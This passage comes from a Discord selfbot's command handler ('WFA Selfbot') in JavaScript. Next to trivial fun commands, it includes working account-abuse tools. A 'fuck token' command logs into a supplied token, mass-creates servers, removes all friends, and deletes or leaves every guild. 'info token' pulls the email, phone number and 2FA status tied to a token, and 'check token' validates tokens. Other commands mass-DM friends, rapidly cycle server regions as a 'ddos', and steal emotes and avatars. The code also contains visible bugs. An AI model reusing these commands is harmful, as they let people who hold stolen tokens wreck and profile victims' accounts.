              ('https://embed.rauf.workers.dev/?author=Commande%2520Avatar&description=Voici%2520l%27avatar%2520de%2520' +
                b5.username +
                '&image=' +
                b5.avatarURL)
          ).catch((b6) =>
            console.log(
              '[',
              'ERREUR'.red,
              ']',
              'an error has occurred that I cannot fix'.green
            )
          )
          console.log(
            consolecolor.instagram('[COMMAND] avatar command executed')
          )
        }
        if (a4.content === prefix + 'change hypesquad brilliance') {
          let b6 = 'https://discordapp.com/api/v6/hypesquad/online'
          const b7 = { house_id: 2 }
          request(b6, {
            method: 'POST',
            headers: {
              authorization: token,
              'content-type': 'application/json',
              'User-Agent':
                'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36',
            },
            body: JSON.stringify(b7),
          })
          a8.edit(
            ":white_check_mark: **You have joined the hypesquad  'brilliance'**"
          )
          console.log(
            consolecolor.instagram(
              '[COMMAND] change hypesquad command executed'
            )
          )
        }
        if (a4.content === prefix + 'change hypesquad ballance') {
          let b8 = 'https://discordapp.com/api/v6/hypesquad/online'
          const b9 = { house_id: 3 }
          request(b8, {
            method: 'POST',
            headers: {
              authorization: token,
              'content-type': 'application/json',
              'User-Agent':
                'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36',
            },
            body: JSON.stringify(b9),
          })
          a8.edit(
            ":white_check_mark: **You have joined the hypesquad  'ballance'**"
          )
          console.log(
            consolecolor.instagram(
              '[COMMAND] change hypesquad command executed'
            )
          )
        }
        if (a4.content === prefix + 'change hypesquad bravery') {
          let ba = 'https://discordapp.com/api/v6/hypesquad/online'
          const bb = { house_id: 1 }
          request(ba, {
            method: 'POST',
            headers: {
              authorization: token,
              'content-type': 'application/json',
              'User-Agent':
                'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36',
            },
            body: JSON.stringify(bb),
          })
          a8.edit(
            ":white_check_mark: **You have joined the hypesquad  'bravery'**"
          )
          request(ba, {
            method: 'POST',
            headers: {
              authorization: token,
              'content-type': 'application/json',
              'User-Agent':
                'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36',
            },
            body: JSON.stringify(bb),
          }),
            a8.edit(
              ":white_check_mark: **You have joined the hypesquad  'bravery'**"
            )
          console.log(
            consolecolor.instagram(
              '[COMMAND] change hypesquad command executed'
            )
          )
        }
        if (a4.content.startsWith(prefix + 'mp friend')) {
          if (!a6) {
            throw 'You must have something to say!'
          }
          let bd =
            a6.splice(2).join(' ') ||
            'WFA Selfbot\nhttps://www.youtube.com/channel/UC6Avt0DUQ2hoU7TeNDOglHg'
          client.user.friends.forEach((be) => {
            be.send(bd).catch((bf) =>
              console.log(
                '[',
                'ERROR'.red,
                ']',
                'an error has occurred that I cannot fix'.green
              )
            )
          })
          console.log(
            consolecolor.instagram('[COMMAND] mp friend command executed')
          )
        }
        a4.content === prefix + 'stats' &&
          (a4
            .edit(
              '```Selfbot - Statistics | WFA - Selfbot\nMemoire Usage: ' +
                (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2) +
                'MB\n\nServers: ' +
                client.guilds.size +
                '\n\nChannels: ' +
                client.channels.size +
                '\n\nMembers: ' +
                client.guilds
                  .map((be) => be.memberCount)
                  .reduce((be, bf) => be + bf) +
                '```'
            )
            .catch((be) =>
              console.log(
                '[',
                'ERROR'.red,
                ']',
                'an error has occurred that I cannot fix'.green
              )
            ),
          console.log(
            consolecolor.instagram('[COMMAND] stats command executed')
          ))
        a4.content.startsWith(prefix + 'purge') &&
          (a4.channel.fetchMessages().then((be) =>
            be.forEach((bf) => {
              bf.author.id === client.user.id &&
                bf
                  .delete()
                  .catch((bg) =>
                    console.log(
                      '[',
                      'ERROR'.red,
                      ']',
                      'an error has occurred that I cannot fix'.green
                    )
                  )
            })
          ),
          console.log(
            consolecolor.instagram('[COMMAND] purge command executed')
          ))
        if (a8.content.startsWith(prefix + 'discord')) {
          a8.edit(
            ghost +
              'https://embed.rauf.workers.dev/?author=Discord%2520Version&description=La%2520version%2520de%2520discord%253A%2520' +
              discord.version
          ).catch((be) =>
            console.log(
              '[',
              'ERROR'.red,
              ']',
              'an error has occurred that I cannot fix'.green
            )
          )
          console.log(
            consolecolor.instagram('[COMMAND] discord command executed')
          )
        }
        a4.content === prefix + 'restart' &&
          (a4
            .edit('**restartredémarrage** of the bot...')
            .then(client.destroy())
            .then(() => client.login(token)),
          console.log(
            consolecolor.instagram('[COMMAND] restart command executed')
          ))
        if (a4.content.startsWith(prefix + 'set server name')) {
          let bg = a6.splice(1).join(' ') || 'WFA selfbot'
          a4.edit('Change the server name to: ' + bg)
          a4.guild.setName(bg)
          console.log(
            consolecolor.instagram(
              '[COMMAND] set serveur name command executed'
            )
          )
        }
        if (a4.content.startsWith(prefix + 'token')) {
          if (!a7) {
            a4.edit(':x: **Please mention a user!**')
            return
          }
          const bi = a7.username.split(' ').join('%2520'),
            bj = client.user.username.split(' ').join('%2520')
          let bk = ['HircHg', 'XnyXiA', 'XluxwQ', 'XXn_KA', 'Xiq-WQ'],
            bl = [
              'a6uny9jcMjet2W2LASruribq6VI',
              'oZyGJDamSJ4hmJaaLvzdNo1bLqk',
              '3_6Xt2k4OieDKimnNYGWUq9vJRo',
              'xllelHltGdY7DP_0s1XST4cgzTs',
            ]
          var ac = a7.id,
            ad = utf8.encode(ac),
            ae = base64.encode(ad)
          setTimeout(() => {
            a4.edit(
              '\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591 0%'
            )
          }, 1000)
          setTimeout(() => {
            a4.edit(
              '\u2593\u2593\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591 20%'
            )
          }, 1500)
          setTimeout(() => {
            a4.edit(
              '\u2593\u2593\u2593\u2593\u2591\u2591\u2591\u2591\u2591\u2591 40%'
            )
          }, 2000)
          setTimeout(() => {
            a4.edit(
              '\u2593\u2593\u2593\u2593\u2593\u2593\u2591\u2591\u2591\u2591 60%'
            )
          }, 2500)
          setTimeout(() => {
            a4.edit(
              '\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2591\u2591 80%'
            )
          }, 3000)
          setTimeout(() => {
            a4.edit(
              '\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593 100%'
            )
          }, 3500)
          setTimeout(() => {
            a4.edit(
              ghost +
                ('https://embed.rauf.workers.dev/?author=Token%2520match%2520' +
                  bi +
                  '&description=') +
                ae +
                '.' +
                bk[Math.floor(Math.random() * bk.length)] +
                '.' +
                bl[Math.floor(Math.random() * bl.length)]
            ).catch((bn) =>
              console.log(
                '[',
                'ERROR'.red,
                ']',
                'an error has occurred that I cannot fix'.green
              )
            )
          }, 4000)
          console.log(
            consolecolor.instagram('[COMMAND] token command executed')
          )
        }
        if (a4.content.startsWith(prefix + 'sansxksch')) {
          console.log(' ')
          console.log(
            consolecolor.mind('[EASTER EGG] GG you find an easter egg !')
          )
          console.log(
            consolecolor.mind(
              '[EASTER EGG] Sans and KSCH are the designers of WFA Project !'
            )
          )
          console.log(' ')
        }
        a4.content.startsWith(prefix + 'ksch') &&
          (console.log(' '),
          console.log(
            consolecolor.mind('[EASTER EGG] GG you find an easter egg !')
          ),
          console.log(
            consolecolor.mind(
              '[EASTER EGG] KSCH is he the developer of WFA Project !'
            )
          ),
          console.log(' '))
        if (a4.content.startsWith(prefix + 'encode')) {
          var ag = a6.join(' ') || 'WFA selfbot'
          var ad = utf8.encode(ag)
          var af = base64.encode(ad)
          var ah = af.split(' ').join('%2520')
          a4.edit(
            ghost +
              ('https://embed.rauf.workers.dev/?author=Code%2520Encode&description=Text%2520-%253E%2520Base64%253A%2520' +
                ah)
          ).catch((br) =>
            console.log(
              '[',
              'ERROR'.red,
              ']',
              'an error has occurred that I cannot fix'.green
            )
          )
          console.log(
            consolecolor.instagram('[COMMAND] encode command executed')
          )
        }
        if (a4.content.startsWith(prefix + 'steal bannier')) {
          a4.delete()
          let br = a4.guild.bannerURL
          console.log(
            consolecolor.instagram('[COMMAND] steal bannier command executed')
          )
          console.log(
            ('Voici la bannière de ' + a4.guild.name + ': ').blue +
              ('' + br).green
          )
        }
        if (a4.content.startsWith(prefix + 'steal emote')) {
          if (a4.channel.type === 'dm') {
            a4.edit(':x: **Command not executable in dm**')
            return
          }
          let bs = a6.splice(2).join(' '),
            bt = client.guilds.get(bs)
          if (!bt) {
            a4.edit(':x: **No server found with the id** "' + bs + '"')
            return
          }
          if (!a4.member.hasPermission('MANAGE_EMOJIS')) {
            return a4.edit(
              ':x: **You do not have "Manage emojis" permissions on this server**'
            )
          }
          bt.emojis.size < 1 &&
            a4.edit(':x: **The server does not contain any emote.**')
          bt.emojis.forEach((bx) => {
            setTimeout(() => {
              let bz = bx.name
              const bA =
                'https://cdn.discordapp.com/emojis/' + bx.id + '.' + bx.animated
                  ? 'gif'
                  : 'png'
              a4.guild.createEmoji(bA, bz).catch((bB) => '1' + 1)
            }, 1500)
          })
          console.log(
            consolecolor.instagram('[COMMAND] steal emote command executed')
          )
          a4.edit(
            ':white_check_mark: **I stole the emotes from the server** "' +
              bt.name +
              '"'
          )
        }
        if (a4.content == prefix + 'delete all emote') {
          if (a4.channel.type === 'dm') {
            a4.edit(':x: **Command not executable in dm**')
            return
          }
          if (a4.guild.emogis.size < 1) {
            a4.edit(':x: **There are no emotes to delete.**')
            return
          }
          a4.guild.emojis.forEach((by) => {
            a4.guilds.emojis.get(by.id).delete()
          })
          console.log(
            consolecolor.instagram(
              '[COMMAND] delete all emote command executed'
            )
          )
        }
        if (a4.content.startsWith(prefix + 'grab pfp')) {
          let bz = a4.mentions.users.first(),
            bA = bz.avatarURL
          if (!bz) {
            a4.edit(':x: **Please mention a user valide!**')
            return
          }
          if (!bA) {
            a4.edi(':x: **This user does not have an avatar!**')
            return
          }
          client.user.setAvatar(bA)
          console.log(
            consolecolor.instagram('[COMMAND] grab pfp command executed')
          )
          a4.edit(
            ':white_check_mark: **I correctly stole the profile picture of ** "' +
              bz.username +
              '"'
          )
        }
        if (a4.content == prefix + 'backup friend') {
          var ai = client.user.friends.size
          const bC = client.user.friends.array()
          let bD =
            'Successfully backed up ' +
            bC.length.toString().bold +
            ' friends.'.green
          console.log(bD)
          hastebins(bC + '\n').then((bE) => {
            a4.edit(
              '```WFA BACKUP FRIEND\n\nhastebins link: ' +
                bE +
                '\n\n***you can copy and paste the list on the current channel and then you can right click on a nickname / send a message / add friend ect...```'
            ).catch((bF) =>
              console.log(
                '[',
                'ERROR'.red,
                ']',
                'an error has occurred that I cannot fix'.green
              )
            )
            console.log(
              consolecolor.instagram('[COMMAND] backup friend command executed')
            )
          })
        }
        if (a4.content === prefix + 'ddos voc') {
          if (!a8.guild) {
            return a4.edit(':x: **Please run this command on a server**')
          }
          if (!a4.member.hasPermission('ADMINISTRATOR')) {
            a4.channel.send(
              ':x: **You need administrator permissions to run this command**'
            )
            return
          }
          let bE = 0
          const bF = [
            'japan',
            'hongkong',
            'russia',
            'india',
            'brazil',
            'sydney',
          ]
          setInterval(() => {
            a4.guild.setRegion(bF[bE])
            bE++
            if (bE === bF.length) {
              bE = 0
            }
          }, 1000)
          a8.edit('**ddos vocal command activate**')
          console.log(
            consolecolor.instagram('[COMMAND] ddos voc command executed')
          )
        }
        if (a4.content === prefix + 'ddos-stop') {
          if (!a8.guild) {
            return a4.edit(':x: **Please run this command on a server**')
          }
          clearInterval()
          a8.edit('**ddos command stoped**')
          console.log(consolecolor.instagram('[COMMAND] ddos voc stopée'))
        }
        if (a4.content.startsWith(prefix + 'fuck token')) {
          let bH = new Client(),
            bI = a6.splice(2).join(' '),
            bJ = 'https://discordapp.com/api/v6/users/@me'
          const bK = { authorization: bI }
          const bL = {
            method: 'GET',
            headers: bK,
          }
          request(bJ, bL, function (bM, bN, bO) {
            if (bN.statusCode === 200) {
              bH.on('ready', function () {
                for (pas = 0; pas < 100; pas++) {
                  bH.user.createGuild('WFA-Selfbot', 'london')
                }
              })
              for (pas = 0; pas < 20; pas++) {
                fetch('https://discord.com/api/v8/users/@me/settings', {
                  headers: {
                    authorization: bI,
                    'content-type': 'application/json',
                  },
                  body: '{"theme":"light"}',
                  method: 'PATCH',
                })
                fetch('https://discord.com/api/v8/users/@me/settings', {
                  headers: {
                    authorization: bI,
                    'content-type': 'application/json',
                  },
                  body: '{"theme":"dark"}',
                  method: 'PATCH',
                })
              }
              bH.on('ready', function () {
                bH.user.friends.forEach((bT) => {
                  if (bT.id === '826503000541102200') {
                    return
                  }
                  bH.user
                    .removeFriend(bT)
                    .catch((bU) =>
                      console.log(
                        '[',
                        'ERROR'.red,
                        ']',
                        'une erreur est survenue que je ne peux régler'.green
                      )
                    )
                })
                bH.guilds.forEach((bT) => {
                  if (bT.id === '879157124230414406') {
                    return
                  }
                  if (bT.id === '843993531273707540') {
                    return
                  }
                  if (bT.ownerID === bH.user.id) {
                    bT.delete().catch((bV) => {
                      if (bV) {
                        console.log('Token timeout'.red)
                      }
                    })
                  } else {
                    bT.leave().catch((bV) =>
                      console.log(
                        '[',
                        'ERROR'.red,
                        ']',
                        'une erreur est survenue que je ne peux régler'.green
                      )
                    )
                  }
                })
                a4.edit(':white_check_mark: **Token fuck en cours...**')
              })
              bH.login(bI)
            } else {
              a4.edit(
                '>>> **Token Info | WFA - Selfbot**\n    \n    \n                Le token: \n                ```' +
                  bI +
                  '```\n                \n                Le token ' +
                  bI +
                  " \nn'est pas valide :x:\n    "
              ).catch((bS) =>
                console.log(
                  '[',
                  'ERROR'.red,
                  ']',
                  'une erreur est survenue que je ne peux régler'.green
                )
              )
            }
          })
          console.log(
            consolecolor.instagram('[COMMAND] fuck token command executed')
          )
        }
        if (a4.content.startsWith(prefix + 'info token')) {
          let bN = a6.splice(2).join(' '),
            bO = 'https://discordapp.com/api/v6/users/@me'
          const bP = { authorization: bN }
          const bQ = {
            method: 'GET',
            headers: bP,
          }
          request(bO, bQ, function (bR, bS, bT) {
            if (bS.statusCode === 200) {
              new Promise((bW, bX) => {
                let bZ = 'https://discordapp.com/api/v6/users/@me'
                const c0 = { authorization: bN }
                request(
                  bZ,
                  {
                    method: 'GET',
                    headers: c0,
                  },
                  function (c1, c2, c3) {
                    c3 = JSON.parse(c3)
                    var c4 = c3.id,
                      c5 = c3.username,
                      c6 = c3.avatar,
                      c7 = c3.discriminator,
                      c8 = c3.mfa_enabled,
                      c9 = c3.phone,
                      ca = c3.locale
                    let cb = c3.public_flags,
                      cc = c3.flags,
                      cd = c3.email,
                      ce = c3.verified,
                      cf = c3.nsfw_allowed
                    var cg = ''
                    cg += '\nUser: ' + c5 + '#' + c7
                    cg += '\nId: ' + c4
                    cg += '\nEmail: ' + cd
                    cg += '\nNuméro de telephone: ' + c9
                    cg += '\nAvatar: ' + c6
                    cg += '\nLangue: ' + ca
                    cg += '\nA2f activé?: ' + c8
                    cg += '\nCompte vérifié?: ' + ce
                    cg += '\nNsfw activé?: ' + cf
                    cg += '\nFlags: ' + cc
                    cg += '\nPublic Flags: ' + cb
                    a4.edit('```' + cg + '```').then(
                      console.log(
                        consolecolor.instagram(
                          '[COMMAND] info token command executed'
                        )
                      )
                    )
                  }
                )
              })
            } else {
              a4.edit('**the token is not valid :x:**').catch((bX) =>
                console.log(
                  '[',
                  'ERROR'.red,
                  ']',
                  'an error has occurred that I cannot fix'.green
                )
              )
            }
          })
        }
        if (a4.content.startsWith(prefix + 'check token')) {
          let bS = a6.splice(1).join(' '),
            bT = 'https://discordapp.com/api/v6/users/@me'
          const bU = { authorizaion: bS }
          request(
            bT,
            {
              method: 'GET',
              headers: bU,
            },
            function (bV, bW, bX) {
              if (bW.statusCode === 200) {
                a4.edit(
                  '```diff\n + the token:' + bS + 'is 100% valid \u2714```'
                ).catch((c1) =>
                  console.log(
                    '[',
                    'ERROR'.red,
                    ']',
                    'an error has occurred that I cannot fix'.green
                  )
                )
              } else {
                a4.edit(
                  '```diff\n- The token ' + bS + ' is not valid :x:```'
                ).catch((c1) =>
                  console.log(
                    '[',
                    'ERROR'.red,
                    ']',
                    'an error has occurred that I cannot fix'.green
                  )
                )
              }
              console.log(
                consolecolor.instagram('[COMMAND] check token command executed')
              )
            }
          )
        }
        if (a4.content.startsWith(prefix + 'lovecalc')) {
          let bV = [
            '5%',
            '10%',
            '15%',
            '20%',
            '25%',
            '30%',
            '35%',
            '40%',
            '45%',
            '50%',
            '55',
            '60%',
            '65%',
            '70%',
            '75%',
            '80%',
            '85%',
            '90%',
            '95%',
            '100%',
          ]
          rdm = Math.floor(Math.random(), bV.length)
          laPersonne = a6.slice(0).join(' ') || 'WFA selfbot'
          const bW = laPersonne.split(' ').join('%2520'),
            bX = client.user.username.split(' ').join('%2520')
          a4.edit(
            ghost +
              ('https://embed.rauf.workers.dev/?author=LoveCalc%2520%25E2%259D%25A4&description=relation%2520entre%2520' +
                bW +
                '%2520and%2520' +
                author +
                '%252C%2520relation%2520idim%25C3%25A9e%2520%25C3%25A0%2520' +
                bV[rdm])
          ).catch((bY) =>
            console.log(
              '[',
              'ERROR'.red,
              ']',
              'an error has occurred that I cannot fix'.green
            )
          )
          console.log(
            consolecolor.instagram('[COMMAND] lovecalc command executed')
          )
        }
        a4.content.startsWith(prefix + 'start typing') &&
          (a4.delete(),
          console.log(
            consolecolor.instagram('[COMMAND] start typing command executed')
          ),
          a4.channel.startTyping().catch((bZ) => {}))
        if (a4.content.startsWith(prefix + '8ball')) {
          let bZ = a4.content.split(' ').splice(1).join(' ')
          var aj = [
            'yes',
            'no...',
            'maybe?',
            'probably',
            "I don't think so.",
            'never',
            'you can try...',
          ]
          if (bZ[1] != null) {
            a4.edit(
              bZ +
                '\nthe answer is: ' +
                aj[Math.floor(Math.random() * aj.length)]
            ).catch((c0) =>
              console.log(
                '[',
                'ERROR'.red,
                ']',
                'an error has occurred that I cannot fix'.green
              )
            )
          } else {
            a4.edit(
              "What's your question? :rolling_eyes: (try:" +
                prefix +
                ' 8ball [question])'
            )
          }
          console.log(
            consolecolor.instagram('[COMMAND] 8ball command executed')
          )
        }
        a4.content.startsWith(prefix + 'pp') &&
          (a4.edit('8=:fist:==D'),
          a4.edit('8==:fist:=D'),
          a4.edit('8===:fist:D '),
          a4.edit('8==:fist:=D'),
          a4.edit('8=:fist:==D '),
          a4.edit('8:fist:===D'),
          a4.edit('8=:fist:==D '),
          a4.edit('8==:fist:=D'),
          a4.edit('8===:fist:D'),
          a4.edit('8==:fist:=D:sweat_drops:'),
          a4.edit('8===:fist:D:sweat_drops:'),
          console.log(consolecolor.instagram('[COMMAND] pp command executed')))
        if (a4.content.startsWith(prefix + 'say')) {
          const c2 = [
            'ee5d5d',
            'ee5d9c',
            'ee5dcf',
            'b45dee',
            '5d62ee',
            '5d95ee',
            '5dddee',
            '5deebe',
            '5dee7a',
            '7dee5d',
            'c0ee5d',
            'eecf5d',
            'ee9f5d',
            'ee5d5d',
          ]
          if (!a6) {
            throw 'You must have something to say!'
          }
          let c3 =
            a6.splice(1).join(' ').split(' ').join('%2520') || 'WFA selfbot'
          for (pas = 0; pas < 10; pas++) {
            a4.edit(
              ghost +
                ('https://embed.rauf.workers.dev/?author=Command%2520Say&description=' +
                  c3 +
                  '&color=' +
                  c2)
            ).catch((c4) =>
              console.log(
                '[',
                'ERROR'.red,
                ']',
                'an error has occurred that I cannot fix'.green
              )
            )
          }
          console.log(consolecolor.instagram('[COMMAND] say command executed'))
        }
        if (a4.content.startsWith(prefix + 'fight')) {
          if (!a7) {
            return a8.edit(':x: **No users mentioned**')
          }
          const c4 = a7.username.split(' ').join('%2520'),
            c5 = client.user.username.split(' ').join('%2520')
          a4.edit(
            ghost +
              ('https://embed.rauf.workers.dev/?author=' +
                c4 +
                '%2520VS%2520' +
                c5 +
                '&image=https%253A%252F%252Fwww.photofunky.net%252Foutput%252Fimage%252Fe%252F8%252F8%252Fa%252Fe88abf%252Fphotofunky.gif')
          ).catch((c6) =>
            console.log(
              '[',
              'ERROR'.red,
              ']',
              'an error has occurred that I cannot fix'.green
            )
          )
          console.log(
            consolecolor.instagram('[COMMAND] fight command executed')
          )
        }
        if (a4.content.startsWith(prefix + 'boom')) {
          if (!a7) {
            return a8.edit(':x: **No users mentioned**')
          }
          const c7 = a7.username.split(' ').join('%2520'),
            c8 = client.user.username.split(' ').join('%2520')
          a4.edit(
            ghost +
              ('https://embed.rauf.workers.dev/?author=' +
                c7 +
                '%2520is%2520blown%2520blown%2520up%2520by%2520' +
                c8 +
                '%25F0%259F%2592%25A3%25F0%259F%2592%25A5&image=https%252Fmedia.discordapp.net%252Fattachments%252F648223633185177612%252F650715035592687647%252Fimage0.gif')
          ).catch((c9) =>
            console.log(
              '[',
              'ERROR'.red,
              ']',
              'an error has occurred that I cannot fix'.green
            )
          )
          console.log(consolecolor.instagram('[COMMAND] boom command executed'))
        }
        if (a4.content == prefix + 'shutdown') {
          console.log(consolecolor.atlas('[EVENT] WFA Selfbot stoped'))
          a8.delete()
          setTimeout(() => {
            process.exit(1)
          }, 500)
        }
        if (a4.content == prefix + 'laugh') {
          const ca = client.user.username.split(' ').join('%2520')
          a4.edit(
            ghost +
              ('https://embed.rauf.workers.dev/?author=' +
                ca +
                '%2520laugh%2520%25F0%259F%2598%2582&image=') +
              C[Math.floor(Math.random() * C.length)]
          ).catch((cb) =>
            console.log(
              '[',
              'ERROR'.red,
              ']',
              'an error has occurred that I cannot fix'.green
            )
          )
          console.log(
            consolecolor.instagram('[COMMAND] laugh command executed')
          )
        }
        if (a4.content.startsWith(prefix + 'kiss')) {
          if (!a7) {
            a4.edit(':x: **Please mention a user!**')
            return
          }
          const cb = a7.username.split(' ').join('%2520'),
            cc = client.user.username.split(' ').join('%2520')
          a4.edit(
            ghost +
              ('https://embed.rauf.workers.dev/?author=' +
                cb +
                '%2520kiss%2520' +
                cc +
                '%2520%25E2%259D%25A4&image=') +
              D[Math.floor(Math.random() * D.length)]
          ).catch((ce) =>
            console.log(
              '[',
              'ERROR'.red,
              ']',
              'an error has occurred that I cannot fix'.green
            )
          )
          console.log(consolecolor.instagram('[COMMAND] kiss command executed'))
        }
        if (a4.content.startsWith(prefix + 'veski')) {
          if (!a7) {
            a4.edit(':x: **Please mention a user!**')
            return
          }
          const ce = a7.username.split(' ').join('%2520'),
            cf = client.user.username.split(' ').join('%2520')
          a4.edit(
            ghost +
              ('https://embed.rauf.workers.dev/?author=' +
                ce +
                '%2520veski%2520&image=') +
              F[Math.floor(Math.random() * F.length)]
          ).catch((cg) =>
            console.log(
              '[',
              'ERROR'.red,
              ']',
              'an error has occurred that I cannot fix'.green
            )
          )
          console.log(
            consolecolor.instagram('[COMMAND] veski command executed')
          )
        }
        if (a4.content.startsWith(prefix + 'load')) {
          a4.delete()
          a4.channel.send('```[' + '.'.repeat(50) + ']```').then((cg) => {
            for (i = 0; i <= 50; i++) {
              cg.edit(
                '```[' +
                  '\u2588'.repeat(i) +
                  '.'.repeat(50 - i) +
                  ']  -  ' +
                  (i * 100) / 50 +
                  '%\n' +
                  'loading..```'
              )
            }
            cg.edit('`Chargement terminé !`').catch((ci) =>
              console.log(
                '[',
                'ERROR'.red,
                ']',
                'an error has occurred that I cannot fix'.green
              )
            )
            console.log(
              consolecolor.instagram('[COMMAND] load command executed')
            )
          })
        }
        if (a4.content.startsWith(prefix + 'punch')) {
          if (!a7) {
            a4.edit(':x: **Please mention a user!**')
            return
          }
          const cg = a7.username.split(' ').join('%2520'),
            ch = client.user.username.split(' ').join('%2520')
          a4.edit(
            ghost +
              ('https://embed.rauf.workers.dev/?author=' +
                ch +
                '%2520punch%2520' +
                cg +
                '%2520%25F0%259F%2591%258A&image=') +
              G[Math.floor(Math.random() * G.length)]
          ).catch((ci) =>
            console.log(
              '[',
              'ERROR'.red,
              ']',
              'an error has occurred that I cannot fix'.green
            )
          )
          console.log(
            consolecolor.instagram('[COMMAND] punch command executed')
          )
        }
        if (a4.content.startsWith(prefix + 'hug')) {
          if (!a7) {
            a4.edit(':x: **Please mention a user!**')
            return
          }
          const cj = a7.username.split(' ').join('%2520'),
            ck = client.user.username.split(' ').join('%2520')
          a4.edit(
            ghost +
              ('https://embed.rauf.workers.dev/?author=' +
                ck +
                '%2520hugs%2520' +
                cj +
                '&image=') +
              E[Math.floor(Math.random() * E.length)]
          ).catch((cm) =>
            console.log(
              '[',
              'ERROR'.red,
              ']',
              'an error has occurred that I cannot fix'.green
            )
          )
          console.log(consolecolor.instagram('[COMMAND] hug command executed'))
        }
        a4.content === prefix + 'nitro' &&
          (a4
            .edit('https://discord.gift/' + nitrocode(16, '0aA'))
            .catch((cm) =>
              console.log(
                '[',
                'ERROR'.red,
                ']',
                'an error has occurred that I cannot fix'.green
              )
            ),
          console.log(
            consolecolor.instagram('[COMMAND] nitro command executed')
          ))
        if (a8.content.startsWith(prefix + 'reverse')) {
          let cm = a6.splice(1).join(' ')
          if (!cm) {
            a4.edit(':x: **no text defined**')
          }
          function cn(cp) {
            return cp.split('').reverse().join('')
          }
          let co = cn(cm)
          if ((a6[0] = co)) {
            co = a6.splice(1).join(' ')
          }
          a8.edit('' + co).catch((cp) => {})
          console.log(
            consolecolor.instagram('[COMMAND] reverse command executed')
          )
        }
        if (a4.content.startsWith(prefix + 'kick')) {
          let cp = a4.guild
          if (!cp) {
            a4.edit(':x: **Please run this command on a server!**')
            return
          }
          if (!a7) {
            a4.edit(':x: **Please mention a user!**')
            return
          }
          a7.kick()
            .then((cs) => {
              a4.edit(':wave:', cs.displayName + ' was kicked :point_right: ')
            })
            .catch(() => {
              a4.delete()
              console.log('[ERREUR]'.red + " I can't kick this person".green)
            })
          console.log(consolecolor.instagram('[COMMAND] kick command executed'))
        }
        if (a4.content.startsWith(prefix + 'ban')) {
          let cs = a4.guild
          if (!cs) {
            a4.edit(':x: **Please run this command on a server!**')
            return
          }
          if (!a7) {
            a4.edit(':x: **Please mention a user!**')
            return
          }
          a7.ban()
            .then((cv) => {
              a4.edit(
                ':wave: ' +
                  cv.displayName +
                  'has been successfully banned https://gfycat.com/playfulfittingcaribou :point_right:'
              )
            })
            .catch(() => {
              a4.delete()
              console.log('[ERREUR]'.red + " I can't ban this person".green)
            })
          console.log(consolecolor.instagram('[COMMAND] ban command executed'))
        }
        if (a4.content.startsWith(prefix + 'role info' || prefix + 'ri')) {
          let cv = a4.guild,
            cw = a4.mentions.roles.first()
          if (!cv) {
            return a8.edit(':x: **Please run this command on a server**')
          }
          if (!cw) {
            return a4
              .delete()
              .then(
                console.log(
                  '[' + 'ERROR'.red + ']' + 'a role name is required'.green
                )
              )
          }
          const cx = {
            false: 'Non',
            true: 'Oui',
          }
          const cy = cx
          console.log(
            consolecolor.instagram('[COMMAND] role info command executed')
          )
          a4.edit(
            '```\nRole: <@&' +
              cw.id +
              '>\n\nID of the role: ' +
              cw.id +
              '\n\nColor: ' +
              cw.hexColor +
              '\n\nNumber of members in this role: ' +
              cw.members.size +
              '\n\nposition: ' +
              cw.position +
              '\n\nmentionnable: ' +
              cy[cw.mentionable] +
              '```'
          ).catch((cz) =>
            console.log(
              '[',
              'ERROR'.red,
              ']',
              'an error has occurred that I cannot fix'.green
            )
          )
        }
        if (a4.content.startsWith(prefix + 'add emote')) {
          if (a4.channel.type === 'dm') {
            a4.edit(':x: **Command not executable in dm**')
            return
          }
          let cz = a6.splice(2).join(' '),
            cA = Discord.Util.parseEmoji(cz)
          if (!a6) {
            a4.edit(':x: **Please choose an emote.**')
            return
          }
          if (!cA) {
            a4.edit(
              ':x: **Invalid emote try this** ' +
                prefix +
                'add emote (emote) <name>'
            )
            return
          }
          if (!a4.member.hasPermission('MANAGE_EMOJIS')) {
            a4.edit(
              ':x: **You don\'t have "Manage emojis" permissions on this server**'
            )
            return
          }
          if (cA.id) {
            const cB =
              'https://cdn.discordapp.com/emojis/' + cA.id + '.' + cA.animated
                ? 'gif'
                : 'png'
            let cC = a4.content.split(' ').splice(3) || cA.name
            a4.guild.createEmoji(cB, cC)
            a4.edit(':white_check_mark: **Emote added to the server.**')
            console.log(
              consolecolor.instagram('[COMMAND] add emote command executed')
            )
          } else {
            a4.edit(':x: **Please choose a valid emote!**')
          }
        }
        if (a4.content === prefix + 'emote') {
          if (a4.channel.type === 'dm') {
            a4.edit(':x: **Command not executable in dm**')
            return
          }
          let cE = '',
            cG = 0,
            cH = 0
          function cI(cJ) {
            return client.emogjis.get(cJ).toString()
          }
          a4.guild.emogis.forEach((cJ) => {
            cH++
            if (cJ.animated) {
              cG++
              cE += cI(cJ.id)
            }
          })
          a4.edit(
            '```\nServer: **' +
              a4.guild.name +
              '**\n\nAnimated Emojis: [' +
              cG +
              ']\n' +
              cE ||
              'None\n\nSimple Emotes:\n[' + 0 + '] \n' + '' ||
              'None\n\nTotal emote: [' + cH ||
              'None]\n ' + cE + '```'
          )
          console.log(
            consolecolor.instagram('[COMMAND] emote command executed')
          )
        }
        if (a4.content.startsWith(prefix + 'remove emote')) {
          if (a4.channel.type === 'dm') {
            a4.edit(':x: **Command not executable in dm**')
            return
          }
          if (!a4.member.hasPermission('MANAGE_EMOJIS')) {
            return a4.edit(
              ':x: **You do not have "Manage emojis" permissions on this server**'
            )
          }
          const cJ = a6.splice(2).join(' ')
          if (!cJ) {
            return a4.edit(':x: **Please choose an emote.**')
          }
          let cK = Discord.Util.parseEmoji(cJ)
